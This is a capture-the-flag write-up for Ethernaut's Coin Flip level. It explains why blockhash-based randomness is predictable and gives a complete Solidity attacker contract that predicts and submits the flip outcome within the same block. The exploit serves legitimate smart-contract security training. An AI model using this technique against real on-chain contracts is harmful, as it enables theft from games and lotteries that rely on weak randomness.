# Level 3: [Coin Flip](https://ethernaut.openzeppelin.com/level/0x9240670dbd6476e6a32055E52A0b0756abd26fd2)

## Level objectives:
1. Guess the correct output 10 times.

## Steps:
- The game uses the uint of blockhash / constant as source of random numbers.
```sol
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```
- Such numbers can be manipulated/front-runned and are not a good source of randomness.
- We write a contract to attack the victim contract with the result we compute.
- Why contract? So that the txs are executed in the same block.
```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipGuess {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip victim = CoinFlip(0xeDB0378D4d475f03e01C9802Ba273140e425DC10);

    function determineFlipOutcome() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return victim.flip(side);
    }
}
```
